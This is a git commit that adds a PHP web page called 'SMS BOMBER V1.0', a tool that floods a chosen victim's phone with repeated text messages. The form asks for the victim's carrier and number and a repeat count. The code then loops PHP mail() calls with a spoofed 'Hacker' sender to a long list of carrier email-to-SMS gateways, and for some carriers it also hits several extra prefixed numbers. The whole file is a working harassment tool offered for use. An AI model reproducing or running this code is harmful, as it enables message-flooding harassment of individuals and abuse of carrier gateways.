7092952744b636027d211d5f330e03b594ef44fd
KyxRecon <hoodedexploit@gmail.com>
2016-07-12 12:35:42 -0700

    1
    PHP SCRIPT - SMS BOMBER

---
+++ SMS BOMBER.php
@@ -0,0 +1,432 @@
+<html>
+# php script created by KYXRECON
+<head>
+<meta http-equiv="author" content="SMS BOMBER V1.0"/>
+<title>
+1njection- Sms Bomber
+</title>
+</head>
+<body background="https://4.bp.blogspot.com/-sCkHAIH_vHo/V4IrSeQzDxI/AAAAAAAAClg/R2-FiXjWVlMeV7qCujtPOh14QPmo_ZlAACLcB/s1600/Scree3nshot_4.jpg">
+
+<form name="mailbomb" action="smsbomber.php" method="POST">
+<p><label for="oper"><b><font size="5" color=ff0909  >SMS BOMBER V1.0 BY KYXRECON :</b></font></label><br>
+<p><label for="oper"><b><font size="5" color=ffffff  >Victim mobile operator :</b></font></label><br>
+
+<select size="1" name="oper">
+<option value=>Select Operator</option>
+<option value="@aircel.co.in">Aircel India</option>
+<option value="@airtelap.com">Airtel Andhra Pradesh, India</option>
+<option value="@airtelkk.com">Airtel Karnataka, India</option>
+<option value="@msg.acsalaska.com">Alaska Communications USA</option>
+<option value="@sms.wirefree.informe.ca">Aliant Canada</option>
+<option value="@sms.alltelwireless.com">Alltel (Allied Wireless) USA</option>
+<option value="@text.wireless.alltel.com">Verizon Wireless USA</option>
+<option value="@altiria.com">Altiria Spain</option>
+<option value="@paging.acswireless.com">Ameritech USA</option>
+<option value="@airtelap.com">Andhra Pradesh AirTel India</option>
+<option value="@ideacellular.net">Andhra Pradesh Idea Cellular India</option>
+<option value="@text.aql.com">aql UK</option>
+<option value="@txt.att.net">AT&T Wireless USA(enter domestic-number)</option>
+<option value="@mmode.com">AT&T USA</option>
+<option value="@mms.att.net">AT&T Mobility(formerly Cingular) USA</option>
+<option value="@page.att.net">AT&T Enterprise Paging USA</option>
+<option value="@sms.smartmessagingsuite.com">AT&T Global Smart Messaging Suite USA</option>
+<option value="@ezweb.ne.jp">AU by KDDI Japan</option>
+<option value="@txt.bell.ca">Bell Mobility & Solo Mobile Canada</option>
+<option value="@bellsouth.cl">BellSouth USA</option>
+<option value="@sms.bluecell.com">Bluegrass Cellular USA</option>
+<option value="@psms.bluesky.as">Bluesky Communications American Samoa, USA</option>
+<option value="@myboostmobile.com">Boost Mobile USA</option>
+<option value="@mms.bouyguestelecom.fr">Bouygues Telecom (company) France</option>
+<option value="@sms.boxis.net">Box Internet Services SMS Gateway Switzerland</option>
+<option value="@sfr.fr">SFR France</option>
+<option value="@bulletinmessenger.net">Bulletin.net(enter International Formatted number)</option>
+<option value="@cbeyond.sprintpcs.com">C Beyond (All Page Wireless)</option>
+<option value="@cellcom.quiktxt.com">Cellcom USA</option>
+<option value="@csouth1.com">Cellular South USA</option>
+<option value="@cwemail.com">Centennial Wireless USA, Puerto Rico, and the U.S. Virgin Islands</option>
+<option value="@sms.cvalley.net">Chariton Valley Wireless USA</option>
+<option value="@airtelchennai.com">Chennai Skycell / Airtel India</option>
+<option value="@rpgmail.net">Chennai RPG Cellular India</option>
+<option value="@139.com">China Mobile China</option>
+<option value="@gocbw.com">Cincinnati Bell Cincinnati, Ohio, USA</option>
+<option value="@cingular.com">Cingular (Postpaid) USA</option>
+<option value="@cingulartext.com">Cingular (GoPhone prepaid) USA</option>
+<option value="@clarotorpedo.com.br">Claro Brasil</option>
+<option value="@ideasclaro-ca.com">Claro Nicaragua</option>
+<option value="@vtexto.com">Claro Puerto Rico</option>
+<option value="@sms.cleartalk.us">Cleartalk Wireless(Cleartalk) USA</option>
+<option value="@itsarrived.net">Connection Software (CSoft) United Kingdom</option>
+<option value="@comcel.com.co">Comcel Colombia</option>
+<option value="@sms.mycricket.com">Cricket USA</option>
+<option value="@cspire1.com">C Spire Wireless USA</option>
+<option value="@sms.ctimovil.com.ar">CTI Móvil (Now Claro) Argentina</option>
+<option value="@airtelmail.com">Delhi Airtel India</option>
+<option value="@delhi.hutch.co.in">Delhi Hutch India</option>
+<option value="@digitextdm.com">Digicel Dominica(no-area-code)</option>
+<option value="@smsmail.eplus.de">E-Plus Germany</option>
+<option value="@sms.edgewireless.com">Edge Wireless USA</option>
+<option value="@SMS.elementmobile.net">Element Mobile USA</option>
+<option value="@emtelworld.net">Emtel Mauritius</option>
+<option value="@echoemail.net">Esendex UK</option>
+<option value="@echoemail.net">Esendex USA</option>
+<option value="@esendex.net">Esendex Spain</option>
+<option value="@sms.fido.ca">Fido Canada</option>
+<option value="@smssturen.com">Freebie SMS Europe</option>
+<option value="@mobile.gci.net">General Communications Inc. Alaska, USA</option>
+<option value="@msg.globalstarusa.com">Globalstar(satellit e) International</option>
+<option value="@sms.globul.bg">Globul Bulgaria</option>
+<option value="@airtelmail.com">Goa Airtel India</option>
+<option value="@bplmobile.com">Goa BPL Mobile India</option>
+<option value="@ideacellular.net">Goa Idea Cellular India</option>
+<option value="@gscsms.com">Golden State Cellular California, USA</option>
+<option value="@ideacellular.net">Gujarat Idea Cellular India</option>
+<option value="@airtelmail.com">Gujarat Airtel India</option>
+<option value="@celforce.com">Gujarat Celforce / Fascel India</option>
+<option value="@airtelmail.com">Haryana Airtel India</option>
+<option value="@escotelmobile.com">Haryana Escotel India</option>
+<option value="@hawaii.sprintpcs.com">Hawaiian Telcom Wireless Hawaii, USA</option>
+<option value="@sms.haysystems.com">Hay Systems Ltd (HSL) UK</option>
+<option value="@myhelio.com">Helio South Korea and USA</option>
+<option value="@airtelmail.com">Himachai Pradesh Airtel India</option>
+<option value="@ice.cr">ICE Costa Rica</option>
+<option value="@msg.iridium.com">Iridium (satellite) International</option>
+<option value=".iws@iwspcs.net">i wireless (T-Mobile) Midwest, USA</option>
+<option value="@iwirelesshometext.com">i-wireless (Sprint PCS) USA</option>
+<option value="@mobile.kajeet.net">Kajeet USA</option>
+<option value="@airtelkk.com">Karnataka Airtel India</option>
+<option value="@airtelkerala.com">Kerala Airtel India</option>
+<option value="@bplmobile.com">Kerala BPL Mobile India</option>
+<option value="@escotelmobile.com">Kerala Escotel India</option>
+<option value="@airtelkol.com">Kolkata Airtel India</option>
+<option value="@msg.telus.com">Koodo Mobile Canada</option>
+<option value="@text.longlines.com">LongLines USA</option>
+<option value="@loopmobile.co.in">Loop (BPL Mobile) Mumbai, India</option>
+<option value="@m1.com.sg">M1 Singapore</option>
+<option value="@airtelmail.com">Madhya Pradesh Airtel India</option>
+<option value="@airtelmail.com">Maharashtra Airtel India</option>
+<option value="@bplmobile.com">Maharashtra BPL Mobile India</option>
+<option value="@ideacellular.net">Maharashtra Idea Cellular India</option>
+<option value="@cwmovil.com">Más Móvil Panama</option>
+<option value="@sms.mediaburst.co.uk">Mediaburst UK</option>
+<option value="@sms.ncell.com.np">Ncell (previous name Mero Mobile) Nepal</option>
+<option value="@mymetropcs.com">MetroPCS USA</option>
+<option value="@sms.mtel.net">Mobiltel Bulgaria</option>
+<option value="@sms.mobitel.lk">Mobitel Sri Lanka</option>
+<option value="@sms.movistar.net.ar">Movistar Argentina</option>
+<option value="@movistar.com.co">Movistar Colombia</option>
+<option value="@movistar.net">Movistar Spain</option>
+<option value="@movimensaje.com.ar">Movistar Spain and Latin America</option>
+<option value="@sms.co.za">MTN South Africa</option>
+<option value="@text.mtsmobility.com">MTS Mobility Canada</option>
+<option value="@airtelmail.com">Mumbai Airtel India</option>
+<option value="@bplmobile.com">Mumbai BPL Mobile India</option>
+<option value="@my-cool-sms.com">My-Cool-SMS United Kingdom</option>
+<option value="@messaging.nextel.com">Nextel USA</option>
+<option value="@msgnextel.com.mx">Nextel México</option>
+<option value="@nextel.net.ar">Nextel Argentina</option>
+<option value="@docomo.ne.jp">NTT DoCoMo Japan</option>
+<option value="@o2online.de">O2 Germany</option>
+<option value="@sms.is">OgVodafone Iceland</option>
+<option value="@orange.pl">Orange Polska Poland</option>
+<option value="@sms.orange.nl">Orange Netherlands</option>
+<option value="@orange.net">Orange United Kingdom</option>
+<option value="@ozekisms.com">Ozeki Hungary</option>
+<option value="@vtext.com">Page Plus Cellular(Verizon MVNO) USA</option>
+<option value="@api.panaceamobile.com">Panacea Mobile Worldwide</option>
+<option value="@zsend.com">Pioneer Cellular USA(nine digit number)</option>
+<option value="@alertas.personal.com.ar">Personal Argentina</option>
+<option value="@text.plusgsm.pl">Plus Poland</option>
+<option value="@sms.pocket.com">Pocket Wireless Texas, USA</option>
+<option value="@bplmobile.com">Pondicherry BPL Mobile India</option>
+<option value="@mobiletxt.ca">PC Telecom Canada</option>
+<option value="@airtelmail.com">Punjab Airtel India</option>
+<option value="@qwestmp.com">Qwest Wireless USA</option>
+<option value="@txt.att.net">Red Pocket Mobile (AT&T MVNO) USA</option>
+<option value="@pcs.rogers.com">Rogers Wireless Canada and USA</option>
+<option value="@email2sms.routomessaging.com">RoutoMessagi ng Worldwide</option>
+<option value="@sms.sasktel.com">SaskTel Canada</option>
+<option value="@sendega.com">Sendega Norway</option>
+<option value="@mas.aw">Setar Mobile email (Aruba) Aruba</option>
+<option value="@box.is">Siminn Iceland</option>
+<option value="@smtext.com">Simple Mobile USA</option>
+<option value="@send.smsbroadcast.com.au">SMS Broadcast Australia</option>
+<option value="@sms.smscentral.com.au">SMS Central Australia</option>
+<option value="@starhub-enterprisemessaging.com">Starhub Enterprise Messaging Solution(powered by Soprano) Singapore</option>
+<option value="@page.southernlinc.com">Southernlinc USA</option>
+<option value="@rinasms.com">South Central Communications USA</option>
+<option value="@SpikkoSMS.com">Spikko Israel</option>
+<option value="@messaging.sprintpcs.com">Sprint (PCS) USA</option>
+<option value="@page.nextel.com">Nextel (Sprint) USA</option>
+<option value="@vtext.com">Straight Talk USA</option>
+<option value="@gsm.sunrise.ch">Sunrise Communications Switzerland</option>
+<option value="@rinasms.com">Syringa Wireless USA</option>
+<option value="@sms.teletopiasms.no">TeletopiaSMS Norway</option>
+<option value="@tmomail.net">T-Mobile USA</option>
+<option value="@optusmobile.com.au">T-Mobile (Optus Zoo) Australia</option>
+<option value="@sms.t-mobile.at">T-Mobile Austria</option>
+<option value="@sms.t-mobile.hr">T-Mobile Croatia</option>
+<option value="@t-mobile-sms.de">T-Mobile Germany</option>
+<option value="@gin.nl">T-Mobile Netherlands</option>
+<option value="@airtelmobile.com">Tamil Nadu Airtel India</option>
+<option value="@airsms.com">Tamil Nadu Aircel India</option>
+<option value="@bplmobile.com">Tamil Nadu BPL Mobile India</option>
+<option value="@sms.tele2.se">Tele2 Sweden</option>
+<option value="@etxt.co.nz">Telecom New Zealand</option>
+<option value="@teleflip.com">Teleflip USA</option>
+<option value="@cs-networks.net">CS Networks Serbia</option>
+<option value="@tim.telstra.com">Telstra Integrated Messaging (powered by Soprano) Australia</option>
+<option value="@sms.itcompany.com.au">All Australian Mobile Networks Free 10 SMS to try (powered by IT Company) Australia</option>
+<option value="@msg.telus.com">Telus Mobility Canada and USA</option>
+<option value="@esms.nu">TellusTalk Europe</option>
+<option value="@textmagic.com">TextMagic UK</option>
+<option value="@sms.tigo.com.co">Tigo (Formerly Ola) Colombia</option>
+<option value="@timnet.com">TIM Italy</option>
+<option value="@mmst5.tracfone.com">TracFone (prepaid) USA, Puerto Rico, and the U.S. Virgin Islands</option>
+<option value="@txtlocal.co.uk">Txtlocal UK</option>
+<option value="@utext.com">Unicel USA</option>
+<option value="@viawebsms.com">UniMóvil Corporation UK</option>
+<option value="@email.uscc.net">US Cellular USA</option>
+<option value="@usamobility.net">USA Mobility USA</option>
+<option value="@sms.utbox.net">UTBox Australia</option>
+<option value="@escotelmobile.com">Uttar Pradesh West Escotel India</option>
+<option value="@vtext.com">Verizon Wireless USA</option>
+<option value="@viaerosms.com">Viaero USA</option>
+<option value="@sms.vivacom.bg">Vivacom Bulgaria</option>
+<option value="@torpedoemail.com.br">Vivo Brasil</option>
+<option value="@vmobile.ca">Virgin Mobile Canada</option>
+<option value="@vmobl.com">Virgin Mobile USA</option>
+<option value="@vxtras.com">Virgin Mobile United Kingdom</option>
+<option value="@voda.co.za">Vodacom South Africa</option>
+<option value="@vodafone-sms.de">Vodafone Germany</option>
+<option value="@n.vodafone.ne.jp">Vodafone Chuugoku/Western,Japan</option>
+<option value="@d.vodafone.ne.jp">Vodafone Hokkaido, Japan</option>
+<option value="@r.vodafone.ne.jp">Vodafone Hokuriku/Central North, Japan</option>
+<option value="@k.vodafone.ne.jp">Vodafone Kansai/West, including Osaka, Japan</option>
+<option value="@t.vodafone.ne.jp">Vodafone Kanto/Koushin/East, including Tokyo, Japan</option>
+<option value="@q.vodafone.ne.jp">Vodafone Kyuushu/Okinawa Japan</option>
+<option value="@s.vodafone.ne.jp">Vodafone Skikoku, Japan</option>
+<option value="@h.vodafone.ne.jp">Vodafone Touhoku/Niigata/North, Japan</option>
+<option value="@vodafone.es">Vodafone Spain</option>
+<option value="@mtxt.co.nz">Vodafone New Zealand</option>
+<option value="@sms.wcc.net">West Central Wireless USA</option>
+<option value="@pdx.ne.jp">Willcom Japan</option>
+<option value="@txt.windmobile.ca">Wind Mobile Canada</option>
+<option value="@sms.xit.net">XIT Communications USA - Texas</option>
+</select>
+<p><label for="to"><font size="5" color=ff0909 >Victim Phone Number(without country code) :</font></label><br><input name="to" id="to" type="text" class="formbox" /><br></p>
+<p><label for="num"><font size="5" color=ffffff >How many times do you want us to send the sms ?</font></label><br><input name="num" id="num" type="text" class="formbox"/><br></p>
+<p><label for="message"><font size="5" color=ff0909 >Message(within 140 characters):</font></label><br><textarea name="message" id="message" cols="60" rows="8"></textarea></p>
+<p><input name="submit" id="submit" type="submit" value="Bomb!!" /></p></form>
+<?php
+//Sms bomber code created by 1njection-
+function airtelmail($to,$message,$oper,$num)
+{
+
+$operators=array($to.$oper,"919890".$to.$oper,"919810".$to.$oper,"919898".$to.$oper,"919896".$to.$oper,"919816 ".$to.$oper,"919893".$to.$oper,"919890".$to.$oper, "919892".$to.$oper,"919815".$to.$oper);
+$adhead="From: ".'Hacker'."<".'hacker@enemy.com'.">\r\n";
+for($i=0;$i<=8;$i++)
+{
+$to=$operators[$i];
+for($j=1;$j<=$num;$j++)
+{
+$sent=mail($to,$j,$message,$adhead);
+}
+}
+if($sent)
+{
+echo "<h1>Mail sent successfully!! $num times</h1>";
+}
+else
+{
+echo '<h1>Mail not sent!! Try again</h1>';
+}
+}
+function bplmobile($to,$message,$oper,$num)
+{
+
+$operators=array($to.$oper,"9823".$to.$oper,"9846".$to.$oper,"9821".$to.$oper,"9843".$to.$oper,"919843".$to.$oper);
+$adhead="From: ".'Hacker'."<".'hacker@enemy.com'.">\r\n";
+for($i=0;$i<=4;$i++)
+{
+$to=$operators[$i];
+for($j=1;$j<=$num;$j++)
+{
+$sent=mail($to,$j,$message,$adhead);
+}
+}
+if($sent)
+{
+echo "<h1>Mail sent successfully!! $num times</h1>";
+}
+else
+{
+echo '<h1>Mail not sent!! Try again</h1>';
+}
+}
+function escotelmobile($to,$message,$oper,$num)
+{
+$operators=array("9837".$to.$oper,"9812".$to.$oper ,"9847".$to.$oper);
+$adhead="From: ".'Hacker'."<".'hacker@enemy.com'.">\r\n";
+for($i=0;$i<=2;$i++)
+{
+$to=$operators[$i];
+for($j=1;$j<=$num;$j++)
+{
+$sent=mail($to,$j,$message,$adhead);
+}
+}
+if($sent)
+{
+echo "<h1>Mail sent successfully!! $num times</h1>";
+}
+else
+{
+echo '<h1>Mail not sent!! Try again</h1>';
+}
+}
+function normal($to,$message,$oper,$num)
+{
+$adhead="From: ".'Hacker'."<".'hacker@enemy.com'.">\r\n";
+for($i=1;$i<=$num;$i++)
+{
+$sent=mail($to,$i,$message,$adhead);
+}
+if($sent)
+{
+echo "<h1>Mail sent successfully!! $num times</h1>";
+}
+else
+{
+echo '<h1>Mail not sent!! Try again</h1>';
+}
+}
+if(isset($_POST['submit']) && isset($_POST['oper']) && isset($_POST['to']) && isset($_POST['message']))
+{
+$oper=$_POST['oper'];
+$to=$_POST['to'];
+$message=$_POST['message'];
+if($_POST['num']=="" || strlen($message)>140)
+{
+echo '<h1>Please fill in all valid details and then press Bomb!!</h1>';
+}
+else
+{
+$num=(int)$_POST['num'];
+if($oper=="@aircelap.com")
+{
+$to="91".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airtelchennai.com")
+{
+$to="919840".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@rpgmail.net")
+{
+$to="9841".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@delhi.hutch.co.in")
+{
+$to="9811".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@smsmail.eplus.de" || $oper=="@movistar.net" || $oper=="@o2online.de" || $oper=="@sms.orange.nl" ||
+$oper=="@optusmobile.com.au" || $oper=="sms.tele2.se" || $oper=="@timnet.com" || $oper=="@vodafone-sms.de" || $oper=="@vodafone.es")
+{
+$to="0".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@sms.globul.bg")
+{
+$to="35989".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@celforce.com")
+{
+$to="9825".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airtelkk.com")
+{
+$to="919845".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airtelkerala.com")
+{
+$to="919895".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airtelkol.com")
+{
+$to="919831".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@sms.ncell.com.np")
+{
+$to="977".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@sms.mtel.net")
+{
+$to="35988".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@nextel.net.ar")
+{
+$to="TwoWay.11".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@text.plusgsm.pl")
+{
+$to="+".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@gin.nl")
+{
+$to="31".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airtelmobile.com")
+{
+$to="919894".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airsms.com")
+{
+$to="9842".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@sms.vivacom.bg")
+{
+$to="35987".$to.$oper;
+normal($to,$message,$oper,$num);
+}
+else if($oper=="@airtelmail.com")
+{
+airtelmail($to,$message,$oper);
+}
+else if($oper=="@bplmobile.com")
+{
+bplmobile($to,$message,$oper,$num);
+}
+else if($oper=="@escotelmobile.com")
+{
+escotelmobile($to,$message,$oper,$num);
+}
+else
+{
+$to=$to.$oper;
+normal($to,$message,$oper,$num);
+}
+}
+}
+else
+{
+echo '<h1>Please fill in all the details and then press Bomb!!And Fucked 1njection-:P is here</h1>';
+}
+?>
+</body>
+</html>
